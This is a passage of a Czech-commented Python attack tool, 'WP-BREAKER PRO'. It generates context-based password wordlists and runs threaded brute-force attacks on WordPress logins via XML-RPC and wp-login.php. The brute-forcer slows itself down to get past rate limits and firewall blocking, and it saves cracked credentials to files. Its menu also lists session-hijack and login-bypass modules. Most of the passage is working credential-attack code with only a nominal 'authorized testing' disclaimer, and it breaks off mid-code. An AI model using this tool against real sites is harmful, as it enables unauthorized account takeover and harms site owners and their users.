        # 5. Z názvu firmy
        company = self.context.get("company", "")
        if company:
            company_words = re.findall(r'\w+', company.lower())
            for w in company_words[:3]:
                if len(w) > 2:
                    passwords[w] = 88
                    passwords[w + "123"] = 83
                    passwords[w + "!"] = 80
                    passwords[w + "2024"] = 78
                    passwords[w + "2025"] = 78
                    passwords[w + "2026"] = 78
                    passwords[w.capitalize()] = 76
                    passwords[w.capitalize() + "123"] = 74
        
        # 6. Z klíčových slov stránky
        for kw in self.context.get("keywords", [])[:10]:
            if len(kw) > 3:
                passwords[kw.lower()] = 70
                passwords[kw.lower() + "123"] = 65
                passwords[kw.capitalize()] = 62
        
        # 7. Kombinace jméno + rok
        for email in self.context.get("emails", []):
            name = email.split("@")[0].split(".")[0] if "." in email.split("@")[0] else email.split("@")[0]
            if len(name) > 2:
                for year in ["2024", "2025", "2026", "2023", "2022", "2021", "2020"]:
                    passwords[name.lower() + year] = 70
                    passwords[name.capitalize() + year] = 65
                    passwords[name.lower() + "@" + year] = 60
        
        # 8. Leetspeak varianty
        leet_map = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7', 'l': '1'}
        for base_word in list(passwords.keys())[:30]:
            leet_word = base_word
            for orig, repl in leet_map.items():
                leet_word = leet_word.replace(orig, repl)
            if leet_word != base_word and len(leet_word) > 3:
                passwords[leet_word] = passwords[base_word] + 5
        
        # 9. České specifické
        czech_common = ["heslo", "admin", "spravce", "root", "tajne", "klic", "pristup"]
        for cw in czech_common:
            passwords[cw] = 75
            passwords[cw + "123"] = 70
        
        # 10. Wordpress specifické
        wp_specific = [
            "wp", "wordpress", "wpadmin", "adminwp", "wpadm",
            "wordpress123", "wp2024", "wp2025", "wp2026",
            "wproot", "wpadmin123", "administratorwp"
        ]
        for wpw in wp_specific:
            passwords[wpw] = 72
        
        # Převod na seřazený list podle skóre
        sorted_passwords = sorted(passwords.items(), key=lambda x: x[1], reverse=True)
        
        self.output.success(f"Vygenerováno {len(sorted_passwords)} unikátních hesel")
        self.output.info(f"Top 5: {', '.join([p[0] for p in sorted_passwords[:5]])}")
        
        # Export do souboru
        wordlist_file = f"ai_wordlist_{int(time.time())}.txt"
        with open(wordlist_file, 'w') as f:
            for pw, _ in sorted_passwords:
                f.write(pw + "\n")
        
        self.output.success(f"Wordlist uložen: {wordlist_file}")
        self.output.add_finding("AI Wordlist", f"{len(sorted_passwords)} hesel → {wordlist_file}", "info")
        
        self.output.separator()
        return [p[0] for p in sorted_passwords], wordlist_file


# =============================================================================
# SMART BRUTE FORCER
# =============================================================================

class SmartBruteForcer:
    """Inteligentní brute-force s AI korekcí"""
    
    def __init__(self, target, usernames, passwords, output):
        self.target = target
        self.usernames = usernames if isinstance(usernames, list) else [usernames]
        self.passwords = passwords
        self.output = output
        self.found = []
        self.attempts = 0
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.adaptive_delay = 1.0
        self.captcha_detected = False
        self.rate_limited = False
        self.method = "xmlrpc"  # default
    
    def test_xmlrpc(self, username, password):
        """Test přihlášení přes XML-RPC"""
        xmlrpc_url = self.target.rstrip('/') + "/xmlrpc.php"
        xml_body = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""
        
        try:
            resp = requests.post(
                xmlrpc_url,
                data=xml_body,
                headers={"Content-Type": "text/xml"},
                timeout=8,
                verify=False
            )
            
            if resp.status_code == 200 and "isAdmin" in resp.text:
                return True, "XML-RPC success"
            elif "Incorrect" in resp.text or "incorrect" in resp.text:
                return False, ""
            elif resp.status_code == 403:
                self.rate_limited = True
                return False, "RATE_LIMIT"
            else:
                return False, ""
        except:
            return False, "ERROR"
    
    def test_wplogin(self, username, password):
        """Test přihlášení přes wp-login.php"""
        login_url = self.target.rstrip('/') + "/wp-login.php"
        
        try:
            session = requests.Session()
            login_page = session.get(login_url, timeout=8, verify=False)
            soup = BeautifulSoup(login_page.text, 'html.parser')
            
            # Extrakce nonce a hidden fields
            form_data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": self.target.rstrip('/') + "/wp-admin/",
                "testcookie": "1"
            }
            
            for hidden in soup.find_all("input", type="hidden"):
                if hidden.get("name"):
                    form_data[hidden["name"]] = hidden.get("value", "")
            
            # CAPTCHA detekce
            if "captcha" in login_page.text.lower() or "recaptcha" in login_page.text.lower():
                self.captcha_detected = True
                return False, "CAPTCHA"
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Referer": login_url,
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            resp = session.post(login_url, data=form_data, headers=headers, 
                               allow_redirects=False, timeout=8, verify=False)
            
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if "wp-admin" in location and "reauth" not in location:
                    return True, "wp-login success"
            
            # Rate limit detekce
            if resp.status_code == 429 or resp.status_code == 503:
                self.rate_limited = True
                return False, "RATE_LIMIT"
            
            return False, ""
        except:
            return False, "ERROR"
    
    def worker(self, username, password):
        """Worker pro testování jednoho páru"""
        if self.stop_event.is_set():
            return None
        
        with self.lock:
            self.attempts += 1
            attempt = self.attempts
        
        # Test přes zvolenou metodu
        if self.method == "xmlrpc":
            success, status = self.test_xmlrpc(username, password)
        else:
            success, status = self.test_wplogin(username, password)
        
        # Live progress
        if success:
            self.output.brute_force_progress(attempt, self.total, username, password, "✓ SUCCESS!")
            self.stop_event.set()
            with self.lock:
                self.found.append({"username": username, "password": password, "method": self.method})
        elif status == "RATE_LIMIT":
            self.output.brute_force_progress(attempt, self.total, username, password, "⏱ RATE-LIMITED")
            time.sleep(self.adaptive_delay * 3)
            self.adaptive_delay = min(self.adaptive_delay * 1.5, 10)
        elif status == "CAPTCHA":
            self.output.brute_force_progress(attempt, self.total, username, password, "🛡 CAPTCHA!")
        elif status == "ERROR":
            self.output.brute_force_progress(attempt, self.total, username, password, "⚠ ERR")
        else:
            self.output.brute_force_progress(attempt, self.total, username, password, "")
        
        # Adaptivní zpoždění
        time.sleep(self.adaptive_delay + random.uniform(0, 0.5))
        
        if success:
            return {"username": username, "password": password, "method": self.method}
        return None
    
    def brute_force(self, method="xmlrpc", threads=5):
        """Spustí brute-force útok"""
        self.method = method
        self.total = len(self.usernames) * len(self.passwords)
        
        method_name = "XML-RPC" if method == "xmlrpc" else "wp-login.php"
        self.output.phase(f"SMART BRUTE FORCE - {method_name}")
        self.output.info(f"Cíl: {self.target}")
        self.output.info(f"Uživatelé: {len(self.usernames)} | Hesla: {len(self.passwords)} | Celkem: {self.total}")
        self.output.info(f"Vlákna: {threads} | Adaptivní delay: {self.adaptive_delay}s")
        print()  # New line for progress bar
        
        # Vytvoření seznamu úkolů
        tasks = []
        for username in self.usernames:
            for password in self.passwords:
                tasks.append((username, password))
        
        # Pro menší počty hesel použijeme sekvenční běh (pro live progress)
        if len(self.passwords) < 200:
            for username, password in tasks:
                if self.stop_event.is_set():
                    break
                result = self.worker(username, password)
                if result:
                    self.found = [result]
                    break
        else:
            # Paralelní zpracování
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(self.worker, u, p): (u, p) for u, p in tasks}
                for future in as_completed(futures):
                    if self.stop_event.is_set():
                        break
                    result = future.result()
                    if result:
                        self.found = [result]
                        break
        
        print()  # Nový řádek po progress baru
        self.output.separator()
        return self.found


# =============================================================================
# AI SELF-CORRECTION LOOP
# =============================================================================

class AISelfCorrector:
    """AI korekční smyčka - adaptuje strategii podle výsledků"""
    
    def __init__(self, output):
        self.output = output
        self.strategy_history = []
        self.current_strategy = {}
        self.failures = 0
    
    def analyze_phase_results(self, phase_name, results, context):
        """Analyzuje výsledky fáze a navrhuje úpravy"""
        self.output.phase(f"AI SELF-CORRECTION - Analýza: {phase_name}")
        
        corrections = []
        
        if isinstance(results, dict):
            # Detekce WAF/rate-limit
            if results.get("waf_detected", False):
                corrections.append({
                    "action": "REDUCE_SPEED",
                    "reason": "WAF detekována - zpomaluji útok",
                    "severity": "high"
                })
            
            # Detekce rate-limit z HTTP hlaviček
            if results.get("status_code") in [429, 503]:
                corrections.append({
                    "action": "INCREASE_DELAY",
                    "reason": "Rate limit detekován (429/503)",
                    "severity": "high"
                })
        
        if not corrections:
            self.output.success("Fáze proběhla bez problémů")
            corrections.append({
                "action": "CONTINUE",
                "reason": "Vše v pořádku",
                "severity": "low"
            })
        else:
            for c in corrections:
                sev_color = Fore.RED if c["severity"] == "high" else Fore.YELLOW
                self.output.warning(f"{sev_color}{c['action']}: {c['reason']}{Style.RESET_ALL}")
        
        self.output.separator()
        return corrections


# =============================================================================
# AI REPORT GENERATOR
# =============================================================================

class AIReportGenerator:
    """Generátor finálního AI reportu"""
    
    def __init__(self, target, output, findings, brute_force_result, context):
        self.target = target
        self.output = output
        self.findings = findings
        self.brute_force_result = brute_force_result
        self.context = context
    
    def generate(self):
        """Vygeneruje kompletní AI report"""
        print()
        print(Fore.MAGENTA + Style.BRIGHT + "=" * 65)
        print(Fore.RED + Style.BRIGHT + 
              "  █████╗ ██╗      ██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗")
        print(" ██╔══██╗██║     ██╔════╝ ██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝")
        print(" ███████║██║     ██║  ███╗█████╗  ██████╔╝██║   ██║██████╔╝   ██║   ")
        print(" ██╔══██║██║     ██║   ██║██╔══╝  ██╔══██╗██║   ██║██╔══██╗   ██║   ")
        print(" ██║  ██║███████╗╚██████╔╝███████╗██║  ██║╚██████╔╝██║  ██║   ██║   ")
        print(" ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ")
        print(Fore.MAGENTA + Style.BRIGHT + "=" * 65)
        print(Fore.CYAN + Style.BRIGHT + f"  AI Security Report — {self.target}")
        print(Fore.DIM + f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | "
              f"Duration: {self.output.get_elapsed()}")
        print(Fore.MAGENTA + Style.BRIGHT + "=" * 65 + Style.RESET_ALL)
        print()
        
        # === SEKCE 1: CÍL ===
        print(Fore.CYAN + Style.BRIGHT + " ┌─── [1] TARGET INFORMATION ──────────────────────────────")
        print(Fore.CYAN + Style.BRIGHT + " │" + Style.RESET_ALL)
        print(f" │  {Fore.WHITE}URL:{Style.RESET_ALL}           {Fore.YELLOW}{self.target}{Style.RESET_ALL}")
        
        # Server info
        server = next((f["value"] for f in self.findings if f["category"] == "Server"), "Neznámý")
        print(f" │  {Fore.WHITE}Server:{Style.RESET_ALL}         {Fore.CYAN}{server}{Style.RESET_ALL}")
        
        wp_ver = next((f["value"] for f in self.findings if f["category"] == "WordPress verze"), "Nezjištěna")
        print(f" │  {Fore.WHITE}WordPress:{Style.RESET_ALL}      {Fore.CYAN}{wp_ver}{Style.RESET_ALL}")
        
        ip = next((f["value"] for f in self.findings if f["category"] == "IP"), "N/A")
        print(f" │  {Fore.WHITE}IP adresa:{Style.RESET_ALL}      {Fore.CYAN}{ip}{Style.RESET_ALL}")
        
        company = self.context.get("company", "Nezjištěna")
        print(f" │  {Fore.WHITE}Firma/Projekt:{Style.RESET_ALL}  {Fore.YELLOW}{company}{Style.RESET_ALL}")
        print(Fore.CYAN + Style.BRIGHT + " │" + Style.RESET_ALL)
        print(Fore.CYAN + Style.BRIGHT + " └──────────────────────────────────────────────────────────")
        print()
        
        # === SEKCE 2: ZRANITELNOSTI ===
        print(Fore.RED + Style.BRIGHT + " ┌─── [2] VULNERABILITY ASSESSMENT ─────────────────────────")
        print(Fore.RED + Style.BRIGHT + " │" + Style.RESET_ALL)
        
        vulns = [f for f in self.findings if f["severity"] == "danger"]
        warnings = [f for f in self.findings if f["severity"] == "warning"]
        infos = [f for f in self.findings if f["severity"] == "info"]
        
        # Kritické
        if vulns:
            print(f" │  {Fore.RED}{Style.BRIGHT}⚠ KRITICKÉ ({len(vulns)}):{Style.RESET_ALL}")
            for v in vulns:
                print(f" │    {Fore.RED}●{Style.RESET_ALL} {Fore.WHITE}{v['category']}:{Style.RESET_ALL} "
                      f"{Fore.RED}{v['value']}{Style.RESET_ALL}")
            print(f" │")
        
        # Varování
        if warnings:
            print(f" │  {Fore.YELLOW}{Style.BRIGHT}⚠ VAROVÁNÍ ({len(warnings)}):{Style.RESET_ALL}")
            for w in warnings:
                print(f" │    {Fore.YELLOW}●{Style.RESET_ALL} {Fore.WHITE}{w['category']}:{Style.RESET_ALL} "
                      f"{Fore.YELLOW}{w['value']}{Style.RESET_ALL}")
            print(f" │")
        
        # Info
        if infos:
            print(f" │  {Fore.CYAN}{Style.BRIGHT}ℹ INFORMACE ({len(infos)}):{Style.RESET_ALL}")
            for i in infos[:10]:
                print(f" │    {Fore.CYAN}●{Style.RESET_ALL} {Fore.WHITE}{i['category']}:{Style.RESET_ALL} "
                      f"{Fore.WHITE}{i['value']}{Style.RESET_ALL}")
            if len(infos) > 10:
                print(f" │    {Fore.DIM}... a {len(infos)-10} dalších{Style.RESET_ALL}")
        
        print(Fore.RED + Style.BRIGHT + " │" + Style.RESET_ALL)
        print(Fore.RED + Style.BRIGHT + " └──────────────────────────────────────────────────────────")
        print()
        
        # === SEKCE 3: BRUTE FORCE VÝSLEDEK ===
        print(Fore.GREEN + Style.BRIGHT + " ┌─── [3] BRUTE FORCE RESULT ──────────────────────────────")
        print(Fore.GREEN + Style.BRIGHT + " │" + Style.RESET_ALL)
        
        if self.brute_force_result and len(self.brute_force_result) > 0:
            bf = self.brute_force_result[0]
            print(f" │  {Fore.GREEN}{Style.BRIGHT}██ SUCCESS! PASSWORD CRACKED! ██{Style.RESET_ALL}")
            print(f" │")
            print(f" │  {Fore.WHITE}Username:{Style.RESET_ALL}  {Fore.YELLOW}{Style.BRIGHT}{bf['username']}{Style.RESET_ALL}")
            print(f" │  {Fore.WHITE}Password:{Style.RESET_ALL}  {Fore.GREEN}{Style.BRIGHT}{bf['password']}{Style.RESET_ALL}")
            print(f" │  {Fore.WHITE}Method:{Style.RESET_ALL}    {Fore.CYAN}{bf['method']}{Style.RESET_ALL}")
            access_url = self.target.rstrip('/') + '/wp-admin/'
            print(f" │  {Fore.WHITE}Admin URL:{Style.RESET_ALL} {Fore.CYAN}{access_url}{Style.RESET_ALL}")
            print(f" │")
            
            # Výpis do samostatného souboru pro jistotu
            result_file = f"wp_cracked_{int(time.time())}.txt"
            with open(result_file, 'w') as f:
                f.write(f"TARGET: {self.target}\n")
                f.write(f"USERNAME: {bf['username']}\n")
                f.write(f"PASSWORD: {bf['password']}\n")
                f.write(f"METHOD: {bf['method']}\n")
                f.write(f"ADMIN URL: {access_url}\n")
                f.write(f"DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            print(f" │  {Fore.WHITE}Saved to:{Style.RESET_ALL}   {Fore.GREEN}{result_file}{Style.RESET_ALL}")
            
        else:
            print(f" │  {Fore.YELLOW}{Style.BRIGHT}Password was NOT cracked with current wordlist.{Style.RESET_ALL}")
            print(f" │")
            print(f" │  {Fore.WHITE}Possible reasons:{Style.RESET_ALL}")
            print(f" │  {Fore.DIM}1.{Style.RESET_ALL} Password is complex/not in the AI-generated wordlist")
            print(f" │  {Fore.DIM}2.{Style.RESET_ALL} Rate limiting or WAF blocking attempts")
            print(f" │  {Fore.DIM}3.{Style.RESET_ALL} Username enumeration failed — wrong user")
            print(f" │  {Fore.DIM}4.{Style.RESET_ALL} Two-factor authentication enabled (2FA/MFA)")
            print(f" │")
            print(f" │  {Fore.CYAN}Recommendation:{Style.RESET_ALL} Try a larger external wordlist")
            print(f" │  {Fore.CYAN}Example:{Style.RESET_ALL}  Add rockyou.txt and re-run with option 3")
        
        print(Fore.GREEN + Style.BRIGHT + " │" + Style.RESET_ALL)
        print(Fore.GREEN + Style.BRIGHT + " └──────────────────────────────────────────────────────────")
        print()
        
        # === SEKCE 4: DOPORUČENÍ ===
        print(Fore.BLUE + Style.BRIGHT + " ┌─── [4] RECOMMENDATIONS ──────────────────────────────────")
        print(Fore.BLUE + Style.BRIGHT + " │" + Style.RESET_ALL)
        
        recommendations = []
        for f in self.findings:
            if f["severity"] == "danger":
                rec = f"  {Fore.RED}●{Style.RESET_ALL} Fix: {Fore.WHITE}{f['category']}{Style.RESET_ALL}"
                recommendations.append(rec)
            elif f["severity"] == "warning":
                rec = f"  {Fore.YELLOW}●{Style.RESET_ALL} Review: {Fore.WHITE}{f['category']}{Style.RESET_ALL}"
                recommendations.append(rec)
        
        if recommendations:
            for rec in recommendations[:10]:
                print(f" │  {rec}")
        else:
            print(f" │  {Fore.GREEN}No critical issues found.{Style.RESET_ALL}")
        
        print(f" │")
        print(f" │  {Fore.CYAN}General:{Style.RESET_ALL}")
        print(f" │  {Fore.DIM}●{Style.RESET_ALL} Always keep WordPress core, plugins & themes updated")
        print(f" │  {Fore.DIM}●{Style.RESET_ALL} Use strong passwords (12+ chars with symbols)")
        print(f" │  {Fore.DIM}●{Style.RESET_ALL} Enable 2-factor authentication for admin accounts")
        print(f" │  {Fore.DIM}●{Style.RESET_ALL} Disable XML-RPC if not needed (/xmlrpc.php)")
        print(f" │  {Fore.DIM}●{Style.RESET_ALL} Limit login attempts (plugin like Limit Login Attempts)")
        print(f" │  {Fore.DIM}●{Style.RESET_ALL} Use a Web Application Firewall (WAF)")
        print(f" │  {Fore.DIM}●{Style.RESET_ALL} Disable user enumeration via REST API")
        print(Fore.BLUE + Style.BRIGHT + " │" + Style.RESET_ALL)
        print(Fore.BLUE + Style.BRIGHT + " └──────────────────────────────────────────────────────────")
        print()
        
        # === SEKCE 5: SHRNUTÍ ===
        print(Fore.MAGENTA + Style.BRIGHT + " ┌─── [5] EXECUTIVE SUMMARY ───────────────────────────────")
        print(Fore.MAGENTA + Style.BRIGHT + " │" + Style.RESET_ALL)
        
        total_danger = len(vulns)
        total_warning = len(warnings)
        total_info = len(infos)
        
        print(f" │  {Fore.WHITE}Target:{Style.RESET_ALL}              {Fore.CYAN}{self.target}{Style.RESET_ALL}")
        print(f" │  {Fore.WHITE}Duration:{Style.RESET_ALL}            {Fore.CYAN}{self.output.get_elapsed()}{Style.RESET_ALL}")
        print(f" │  {Fore.WHITE}Critical findings:{Style.RESET_ALL}   {Fore.RED}{total_danger}{Style.RESET_ALL}")
        print(f" │  {Fore.WHITE}Warnings:{Style.RESET_ALL}            {Fore.YELLOW}{total_warning}{Style.RESET_ALL}")
        print(f" │  {Fore.WHITE}Informational:{Style.RESET_ALL}       {Fore.CYAN}{total_info}{Style.RESET_ALL}")
        print(f" │  {Fore.WHITE}Password cracked:{Style.RESET_ALL}    "
              f"{Fore.GREEN}YES{Style.RESET_ALL}" if self.brute_force_result else 
              f" │  {Fore.WHITE}Password cracked:{Style.RESET_ALL}    {Fore.RED}NO{Style.RESET_ALL}")
        print(f" │")
        
        # Celkové skóre
        score = max(0, 100 - (total_danger * 15) - (total_warning * 5))
        if self.brute_force_result:
            score = max(0, score - 30)
        
        if score >= 80:
            grade = Fore.GREEN + "A (Bezpečné)"
        elif score >= 60:
            grade = Fore.YELLOW + "B (Střední riziko)"
        elif score >= 40:
            grade = Fore.RED + "C (Vysoké riziko)"
        else:
            grade = Fore.RED + Style.BRIGHT + "D (KRITICKÉ)"
        
        print(f" │  {Fore.WHITE}Security Score:{Style.RESET_ALL}      {grade}{Style.RESET_ALL}")
        
        print(Fore.MAGENTA + Style.BRIGHT + " │" + Style.RESET_ALL)
        print(Fore.MAGENTA + Style.BRIGHT + " └──────────────────────────────────────────────────────────")
        print()
        
        # Footer
        print(Fore.DIM + "─" * 65)
        print(Fore.CYAN + Style.BRIGHT + f"  WP-BREAKER PRO v{VERSION} • HACKER-AI-DRIVEN")
        print(Fore.DIM + f"  Report generated for authorized security testing only")
        print(Fore.DIM + "─" * 65 + Style.RESET_ALL)
        print()


# =============================================================================
# HLAVNÍ MENU A ORCHESTRACE
# =============================================================================

def clear_screen():
    """Vyčistí obrazovku"""
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    """Zobrazí banner"""
    print(BANNER)
    print(f"  {Fore.DIM}{'─' * 50}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Target:{Style.RESET_ALL} {Fore.YELLOW}{TARGET}{Style.RESET_ALL}")
    print(f"  {Fore.DIM}{'─' * 50}{Style.RESET_ALL}")
    print()


def show_menu():
    """Zobrazí hlavní menu a vrátí volbu"""
    clear_screen()
    print(BANNER)
    print(f"  {Fore.CYAN}{Style.BRIGHT}MAIN MENU{Style.RESET_ALL}")
    print(f"  {Fore.DIM}{'─' * 50}{Style.RESET_ALL}")
    print()
    print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} {Fore.WHITE}🔍 FULL SCAN{Style.RESET_ALL}         {Fore.DIM}(Everything - AI driven){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} {Fore.WHITE}🌐 TCP/IP Fingerprint{Style.RESET_ALL}  {Fore.DIM}(OS, WAF, headers){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL} {Fore.WHITE}🧪 AI Brute-Force (XML-RPC){Style.RESET_ALL}{Fore.DIM}  (Smart + context){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[4]{Style.RESET_ALL} {Fore.WHITE}🧪 AI Brute-Force (wp-login){Style.RESET_ALL}{Fore.DIM} (With nonce){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[5]{Style.RESET_ALL} {Fore.WHITE}🍪 Cookie Injection Test{Style.RESET_ALL} {Fore.DIM}(Admin session hijack){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[6]{Style.RESET_ALL} {Fore.WHITE}🔎 DOM Shadow Analyzer{Style.RESET_ALL}  {Fore.DIM}(Hidden forms, JS){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[7]{Style.RESET_ALL} {Fore.WHITE}🚪 Bypass Researcher{Style.RESET_ALL}    {Fore.DIM}(Alt login paths){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[8]{Style.RESET_ALL} {Fore.WHITE}📋 AI Context Scraper{Style.RESET_ALL}   {Fore.DIM}(Emails, keywords){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[9]{Style.RESET_ALL} {Fore.WHITE}🔑 AI Password Generator{Style.RESET_ALL} {Fore.DIM}(From context){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[10]{Style.RESET_ALL} {Fore.WHITE}📄 Generate Report Only{Style.RESET_ALL}{Fore.DIM} (From saved data){Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[0]{Style.RESET_ALL} {Fore.RED}🚪 Exit{Style.RESET_ALL}")
    print()
    print(f"  {Fore.DIM}{'─' * 50}{Style.RESET_ALL}")
    print()
    
    while True:
        try:
            choice = input(f"  {Fore.CYAN}❯ Select option [0-10]:{Style.RESET_ALL} ").strip()
            if choice.isdigit() and 0 <= int(choice) <= 10:
                return int(choice)
            print(f"  {Fore.RED}Invalid option. Try again.{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print()
            return 0


def set_target():
    """Nastaví nebo změní target"""
    global TARGET
    print()
    print(f"  {Fore.CYAN}{Style.BRIGHT}Target Setup{Style.RESET_ALL}")
    print(f"  {Fore.DIM}{'─' * 50}{Style.RESET_ALL}")
    print(f"  {Fore.DIM}Current target: {Fore.YELLOW}{TARGET}{Style.RESET_ALL}")
    print()
    
    while True:
        new_target = input(f"  {Fore.CYAN}❯ Enter target URL (or Enter to keep current):{Style.RESET_ALL} ").strip()
        if not new_target:
            break
        if not new_target.startswith("http"):
            new_target = "https://" + new_target
        # Basic validation
        try:
            requests.get(new_target, timeout=5, verify=False)
            TARGET = new_target.rstrip('/')
            print(f"  {Fore.GREEN}[✓] Target set to: {Fore.YELLOW}{TARGET}{Style.RESET_ALL}")
            break
        except:
            print(f"  {Fore.RED}[✗] Cannot reach {new_target}. Try again.{Style.RESET_ALL}")


def run_full_scan(target, output):
    """Spustí kompletní sken všech modulů"""
    print()
    print(f"  {Fore.GREEN}{Style.BRIGHT}{'█' * 50}")
    print(f"  {Fore.GREEN}{Style.BRIGHT}  FULL SCAN INITIATED — AI SUPERIOR MODE")
    print(f"  {Fore.GREEN}{Style.BRIGHT}{'█' * 50}{Style.RESET_ALL}")
    print()
    
    all_findings = []
    context = {}
    brute_result = []
    
    output.info(f"Starting full scan against: {target}")
    output.info(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    output.separator()
    
    # 1. TCP/IP Fingerprint
    fingerprinter = TcpIpFingerprinter(target, output)
    fp_results = fingerprinter.fingerprint()
    all_findings.extend(output.findings)
    
    # 2. AI Context Scraper
    scraper = AIContextScraper(target, output)
    context = scraper.scrape()
    all_findings.extend(output.findings)
    
    # 3. DOM Shadow Analyzer
    dom_analyzer = DOMShadowAnalyzer(target, output)
    dom_results = dom_analyzer.analyze()
    all_findings.extend(output.findings)
    
    # 4. Cookie Engine
    cookie_engine = CookieEngine(target, output)
    cookie_results = cookie_engine.analyze_cookies()
    all_findings.extend(output.findings)
    
    # 5. Bypass Researcher
    bypass = BypassResearcher(target, output)
    bypass_results = bypass.research()
    all_findings.extend(output.findings)
    
    # 6. AI Self-Correction
    corrector = AISelfCorrector(output)
    corrections = corrector.analyze_phase_results("Full Scan Review", fp_results, context)
    
    # 7. AI Password Generator
    pw_gen = AIPasswordGenerator(context, output)
    passwords, wordlist_file = pw_gen.generate()
    all_findings.extend(output.findings)
    
    # 8. Smart Brute Force (XML-RPC first, then wp-login)
    # Zkusíme nejdříve XML-RPC
    usernames = context.get("users", []) or ["admin"]
    if not context.get("users"):
        # Zkusíme extrahovat uživatele z bypass researcheru
        usernames = ["admin"]
        # Přidáme jména z kontextu
        for name in context.get("names", []):
            if len(name) < 20 and " " not in name:
                usernames.append(name.lower())
        usernames = list(set(usernames))[:5]
    
    if bypass_results.get("xmlrpc"):
        output.info("XML-RPC available — trying XML-RPC brute force first")
        bf = SmartBruteForcer(target, usernames, passwords, output)
        brute_result = bf.brute_force(method="xmlrpc", threads=3)
    
    if not brute_result:
        output.info("Trying wp-login.php brute force...")
        bf = SmartBruteForcer(target, usernames, passwords, output)
        brute_result = bf.brute_force(method="wplogin", threads=2)
    
    all_findings.extend(output.findings)
    
    # 9. FINÁLNÍ REPORT
    report = AIReportGenerator(target, output, all_findings, brute_result, context)
    report.generate()
    
    return brute_result


# =============================================================================
# MAIN
# =============================================================================

if __name__ == "__main__":
    # Ignorovat SSL varování
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    TARGET = ""
    output = LiveOutput()
    
    clear_screen()
    print(BANNER)
    
    print(f"  {Fore.GREEN}{Style.BRIGHT}Welcome to WP-BREAKER PRO v{VERSION}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}HACKER-AI-DRIVEN • MULTI-FUNCTIONAL • SUPER-INTELLIGENT{Style.RESET_ALL}")
    print(f"  {Fore.DIM}Authorized penetration testing tool{Style.RESET_ALL}")
    print()
    
    # Nastavení targetu
    while not TARGET:
        t = input(f"  {Fore.CYAN}❯ Enter target URL (e.g., https://example.com):{Style.RESET_ALL} ").strip()
        if t:
            if not t.startswith("http"):
                t = "https://" + t
            try:
                test = requests.get(t, timeout=5, verify=False)
                TARGET = t.rstrip('/')
                print(f"  {Fore.GREEN}[✓] Target reachable: {Fore.YELLOW}{TARGET}{Style.RESET_ALL}")
            except:
                print(f"  {Fore.RED}[✗] Cannot reach target. Check URL or internet connection.{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}[!] Setting target anyway (offline mode)...{Style.RESET_ALL}")
                TARGET = t.rstrip('/')
    
    # Hlavní smyčka menu
    while True:
        choice = show_menu()
        
        if choice == 0:
            clear_screen()
            print(BANNER)
            print(f"\n  {Fore.GREEN}{Style.BRIGHT}Thank you for using WP-BREAKER PRO v{VERSION}{Style.RESET_ALL}")
            print(f"  {Fore.CYAN}Stay ethical, stay legal.{Style.RESET_ALL}\n")
            sys.exit(0)
        
        elif choice == 1:
            # FULL SCAN
            output = LiveOutput()
            brute_result = run_full_scan(TARGET, output)
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
        
        elif choice == 2:
            # TCP/IP Fingerprinting
            output = LiveOutput()
            fp = TcpIpFingerprinter(TARGET, output)
            fp.fingerprint()
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
        
        elif choice == 3:
            # AI Brute-Force XML-RPC
            output = LiveOutput()
            
            # Nejprve kontext
            scraper = AIContextScraper(TARGET, output)
            context = scraper.scrape()
            
            # Uživatelé
            usernames = context.get("users", []) or ["admin"]
            if not context.get("users"):
                usernames = ["admin"]
            
            print(f"\n  {Fore.CYAN}Usernames to try: {', '.join(usernames[:5])}{Style.RESET_ALL}")
            print(f"  {Fore.DIM}(Using AI-generated wordlist from context){Style.RESET_ALL}")
            
            pw_gen = AIPasswordGenerator(context, output)
            passwords, _ = pw_gen.generate()
            
            print(f"\n  {Fore.YELLOW}[!] Starting XML-RPC brute force with {len(passwords)} passwords...{Style.RESET_ALL}")
            bf = SmartBruteForcer(TARGET, usernames, passwords, output)
            brute_result = bf.brute_force(method="xmlrpc", threads=3)
            
            if brute_result:
                output.success(f"PASSWORD FOUND: {brute_result[0]['username']}:{brute_result[0]['password']}")
                result_file = f"wp_cracked_{int(time.time())}.txt"
                with open(result_file, 'w') as f:
                    f.write(f"TARGET: {TARGET}\n")
                    f.write(f"USERNAME: {brute_result[0]['username']}\n")
